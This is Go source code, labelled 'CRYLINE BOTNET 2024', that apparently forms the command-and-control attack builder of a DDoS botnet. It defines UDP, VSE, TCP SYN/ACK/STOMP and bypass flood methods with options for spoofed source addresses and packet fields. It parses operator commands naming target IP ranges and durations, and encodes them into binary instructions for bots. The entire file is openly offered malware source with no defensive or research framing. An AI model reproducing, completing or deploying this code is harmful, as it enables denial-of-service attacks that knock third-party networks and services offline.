/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

package main

import (
    "fmt"
    "strings"
    "strconv"
    "net"
    "encoding/binary"
    "errors"
    "github.com/mattn/go-shellwords"
)

type __ATTACK_INFO struct {
    _ATTACK_ID uint8
    _ATTACK_FLAGS []uint8
    _ATTACK_DESCRIPTION string
}

type __ATTACK struct {
    _DURATION uint32
    _TYPE uint8
    _TARGETS map[uint32]uint8
    _OPTIONS map[uint8]string
}

type __OPTIONS_INFO struct {
    _OPTION_ID uint8
    _OPTION_DESCRIPTION string
}

var __FLAG_INFO_LOOKUP map[string]__OPTIONS_INFO = map[string]__OPTIONS_INFO {
    "lenght": __OPTIONS_INFO {
        0,
        "Size of packet data [By default: 512 bytes]",
    },
    "random": __OPTIONS_INFO {
        1,
        "Randomize of packet data [By default: 1, randomize enabled]",
    },
    "tos": __OPTIONS_INFO {
        2,
        "TOS field value in IP header [By default: 1]",
    },
    "ident": __OPTIONS_INFO {
        3,
        "ID field value in IP header [By default: random]",
    },
    "ttl": __OPTIONS_INFO {
        4,
        "TTL field in IP header [By default: 255]",
    },
    "dfb": __OPTIONS_INFO {
        5,
        "Dont-Fragment bit in IP header [By default: 0, not used]",
    },
    "lport": __OPTIONS_INFO {
        6,
        "Source port [By default: random]",
    },
    "rport": __OPTIONS_INFO {
        7,
        "Destination port [By default: random]",
    },
    "tcpurg": __OPTIONS_INFO {
        8,
        "URG bit in IP header [By default: 0, not used]",
    },
    "tcpack": __OPTIONS_INFO {
        9,
        "ACK bit in IP header [By default: 0, not used. In TCP ACK flood: 1]",
    },
    "tcppsh": __OPTIONS_INFO {
        10,
        "PSH bit in IP header [By default: 0, not used]",
    },
    "tcprst": __OPTIONS_INFO {
        11,
        "RST bit in IP header [By default: 0, not used]",
    },
    "tcpsyn": __OPTIONS_INFO {
        12,
        "SYN bit in IP header [By default: 0, not used. In TCP SYN flood: 1]",
    },
    "tcpfin": __OPTIONS_INFO {
        13,
        "FIN bit in IP header [By default: 0, not used]",
    },
    "seqnum": __OPTIONS_INFO {
        14,
        "Sequence number value in TCP header [By default: 0, not used]",
    },
    "acknum": __OPTIONS_INFO {
        15,
        "Ack number value in TCP header [By default: random]",
    },
    "sourceip": __OPTIONS_INFO {
        16,
        "Source IP address, [By default: 255.255.255.255 for random]",
    },
    "randomlenght": __OPTIONS_INFO {
        17,
        "Random length",
    },
}

var __ATTACK_INFO_LOOKUP map[string]__ATTACK_INFO = map[string]__ATTACK_INFO {
    "/udp": __ATTACK_INFO {
        0,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 16 },
        "",
    },
    "/vse": __ATTACK_INFO {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "",
    },
    "/tcpsyn": __ATTACK_INFO {
        2,
        []uint8 { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 },
        "",
    },
    "/tcpack": __ATTACK_INFO {
        3,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 },
        "",
    },
    "/tcpstomp": __ATTACK_INFO {
        4,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13 },
        "",
    },
    "/udpplain": __ATTACK_INFO {
        5,
        []uint8 {0, 1, 6, 7},
        "",
    },
    "/socket": __ATTACK_INFO {
        6,
        []uint8 {0, 7, 17},
        "",
    },
    "/udpbypass": __ATTACK_INFO {
        7,
        []uint8 {6, 7},
        "",
    },
}

func __UINT8_IN_SLICE(_GET_INPUT_PATTERN uint8, _GET_LIST []uint8) bool {
    for _, _GET_FIRST_PATTERN := range _GET_LIST {     
        if _GET_FIRST_PATTERN == _GET_INPUT_PATTERN {
            return true
        }
    }
    return false
}

func __GENERATE_NEW_ATTACK(_STRING string, _ADMIN_USER int) (*__ATTACK, error) {
    _ATTACK := &__ATTACK{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
    
    _PARAMS, _ := shellwords.Parse(_STRING)

    var _ATTACK_INFO __ATTACK_INFO

    if len(_PARAMS) == 0 {
        return nil, errors.New("[-] Must specify an attack name!")
    } else {

        if _PARAMS[0] == "?" || _PARAMS[0] == "help" || _PARAMS[0] == "HELP" {
            _CMD_LIST := "\033[91m[Available attack list]\r\n\033[0m"

            for _CMD_NAME, _ATTACK_INFO := range __ATTACK_INFO_LOOKUP {
                _CMD_LIST += "\x1b[38;5;202m" + _CMD_NAME + "\x1b[0m: \x1b[38;5;202m" + _ATTACK_INFO._ATTACK_DESCRIPTION + "\r\n\x1b[0m"
            }

            return nil, errors.New(_CMD_LIST)
        }

        var _EXIST bool

        _ATTACK_INFO, _EXIST = __ATTACK_INFO_LOOKUP[_PARAMS[0]]

        if !_EXIST {
            return nil, errors.New(fmt.Sprintf("[!] \033[33;1m%s \033[31mis not valid attack!", _PARAMS[0]))
        }

        _ATTACK._TYPE = _ATTACK_INFO._ATTACK_ID

        _PARAMS = _PARAMS[1:]
    }

    if len(_PARAMS) == 0 {
        return nil, errors.New("[-] Must specify prefix as targets!")
    } else {
        if _PARAMS[0] == "?" {
            return nil, errors.New("[!] \033[37;1mDelimited list of target prefixes!\r\n[!]Example: 192.168.0.1\r\n[!]Example: 10.0.0.0/8\r\n[!]Example: 8.8.8.8,127.0.0.0/29!")
        }

        _CIDR_ARGS := strings.Split(_PARAMS[0], ",")

        if len(_CIDR_ARGS) > 255 {
            return nil, errors.New("[!] Cannot specify more than 255 targets in single attack!")
        }

        for _,_CIDR_NETMASK := range _CIDR_ARGS {
            _PREFIX := ""
            _NETMASK := uint8(32)
            _CIDR_INFO := strings.Split(_CIDR_NETMASK, "/")

            if len(_CIDR_INFO) == 0 {
                return nil, errors.New("[!] Blank target specified!")
            }

            _PREFIX = _CIDR_INFO[0]

            if len(_CIDR_INFO) == 2 {
                _NETMASK_TEMP, _GET_ERROR := strconv.Atoi(_CIDR_INFO[1])

                if _GET_ERROR != nil || _NETMASK > 32 || _NETMASK < 0 {
                    return nil, errors.New(fmt.Sprintf("[!] Invalid netmask was supplied: \033[33;1m%s \033!", _CIDR_NETMASK))
                }

                _NETMASK = uint8(_NETMASK_TEMP)

            } else if len(_CIDR_INFO) > 2 {
                return nil, errors.New(fmt.Sprintf("[!] Too many slash's in prefix: \033[33;1m%s \033!", _CIDR_NETMASK))
            }

            _GET_IP := net.ParseIP(_PREFIX)

            if _GET_IP == nil {
                return nil, errors.New(fmt.Sprintf("[!] Failed to parse IP address: \033[33;1m%s \033!", _CIDR_NETMASK))
            }

            _ATTACK._TARGETS[binary.BigEndian.Uint32(_GET_IP[12:])] = _NETMASK
        }
        _PARAMS = _PARAMS[1:]
    }

    if len(_PARAMS) == 0 {
        return nil, errors.New("[!] Must specify an attack duration!")
    } else {
        if _PARAMS[0] == "?" {
            return nil, errors.New("[!] \033[37;1mDuration of the sttack, in seconds!")
        }

        _DURATION, _GET_ERROR := strconv.Atoi(_PARAMS[0])

        if _GET_ERROR != nil || _DURATION == 0 || _DURATION > 3600 {
            return nil, errors.New(fmt.Sprintf("[!] Invalid attack duration: \033[33;1m%s \033. Duration must be between 0 and 3600 seconds!", _PARAMS[0]))
        }

        _ATTACK._DURATION = uint32(_DURATION)

        _PARAMS = _PARAMS[1:]
    }

    for len(_PARAMS) > 0 {
        if _PARAMS[0] == "?" {
            _VALID_OPTION := "[!] \033[37;1mList of flags option=key seperated by spaces. Look at options for this method: \r\n\r\n"
            for _, _OPTION_ID := range _ATTACK_INFO._ATTACK_FLAGS {
                for _OPTION_NAME, _OPTION_DESCRIPTION := range __FLAG_INFO_LOOKUP {
                    if _OPTION_ID == _OPTION_DESCRIPTION._OPTION_ID {
                        _VALID_OPTION += _OPTION_NAME + ": " + _OPTION_DESCRIPTION._OPTION_DESCRIPTION + "\r\n"

                        break
                    }
                }
            }
            _VALID_OPTION += "\r\n[!] Value of 65535 for flag denotes random!\r\n"

            _VALID_OPTION += "[!] Example: seq=0\r\n[!] Example: lport=0 rport=65535!"

            return nil, errors.New(_VALID_OPTION)
        }

        _OPTION_SPLIT := strings.SplitN(_PARAMS[0], "=", 2)

        if len(_OPTION_SPLIT) != 2 {
            return nil, errors.New(fmt.Sprintf("[!] Invalid option of value flag combination: \033[33;1m%s \033!", _PARAMS[0]))
        }

        _OPTION_DESCRIPTION, _EXIST := __FLAG_INFO_LOOKUP[_OPTION_SPLIT[0]]

        if !_EXIST || !__UINT8_IN_SLICE(_OPTION_DESCRIPTION._OPTION_ID, _ATTACK_INFO._ATTACK_FLAGS) || (_ADMIN_USER == 0 && _OPTION_DESCRIPTION._OPTION_ID == 25) {
            return nil, errors.New(fmt.Sprintf("[!] Invalid option of: \033[33;1m%s \033: \033[33;1m%s \033!", _OPTION_SPLIT[0], _PARAMS[0]))
        }

        if _OPTION_SPLIT[1][0] == '"' {
            _OPTION_SPLIT[1] = _OPTION_SPLIT[1][1:len(_OPTION_SPLIT[1]) - 1]

            fmt.Println(_OPTION_SPLIT[1])
        }

        if _OPTION_SPLIT[1] == "true" {
            _OPTION_SPLIT[1] = "1"
        } else if _OPTION_SPLIT[1] == "false" {
            _OPTION_SPLIT[1] = "0"
        }

        _ATTACK._OPTIONS[uint8(_OPTION_DESCRIPTION._OPTION_ID)] = _OPTION_SPLIT[1]

        _PARAMS = _PARAMS[1:]
    }
    if len(_ATTACK._OPTIONS) > 255 {
        return nil, errors.New("[!] Cannot have more than 255 flags!")
    }

    return _ATTACK, nil
}

func (_THIS *__ATTACK) Build() ([]byte, error) {
    _BUFFER := make([]byte, 0)

    var _GET_LOCAL_TEMP []byte

    _GET_LOCAL_TEMP = make([]byte, 4)

    binary.BigEndian.PutUint32(_GET_LOCAL_TEMP, _THIS._DURATION)

    _BUFFER = append(_BUFFER, _GET_LOCAL_TEMP...)

    _BUFFER = append(_BUFFER, byte(_THIS._TYPE))

    _BUFFER = append(_BUFFER, byte(len(_THIS._TARGETS)))

    for _PREFIX,_NETMASK := range _THIS._TARGETS {
        _GET_LOCAL_TEMP = make([]byte, 5)

        binary.BigEndian.PutUint32(_GET_LOCAL_TEMP, _PREFIX)

        _GET_LOCAL_TEMP[4] = byte(_NETMASK)

        _BUFFER = append(_BUFFER, _GET_LOCAL_TEMP...)
    }

    _BUFFER = append(_BUFFER, byte(len(_THIS._OPTIONS)))

    for _GET_OPTION_PARAM,_GET_OPTION_PARAM_VALUE := range _THIS._OPTIONS {
       
        _GET_LOCAL_TEMP = make([]byte, 2)
        _GET_LOCAL_TEMP[0] = _GET_OPTION_PARAM

        strbuf := []byte(_GET_OPTION_PARAM_VALUE)

        if len(strbuf) > 255 {
            return nil, errors.New("[-] Flag value cannot be more than 255 bytes!")
        }

        _GET_LOCAL_TEMP[1] = uint8(len(strbuf))

        _GET_LOCAL_TEMP = append(_GET_LOCAL_TEMP, strbuf...)

        _BUFFER = append(_BUFFER, _GET_LOCAL_TEMP...)
    }

    if len(_BUFFER) > 4096 {
        return nil, errors.New("[-] Max buffer is 4096 lenght!")
    }

    _GET_LOCAL_TEMP = make([]byte, 2)

    binary.BigEndian.PutUint16(_GET_LOCAL_TEMP, uint16(len(_BUFFER) + 2))

    _BUFFER = append(_GET_LOCAL_TEMP, _BUFFER...)

    return _BUFFER, nil
}
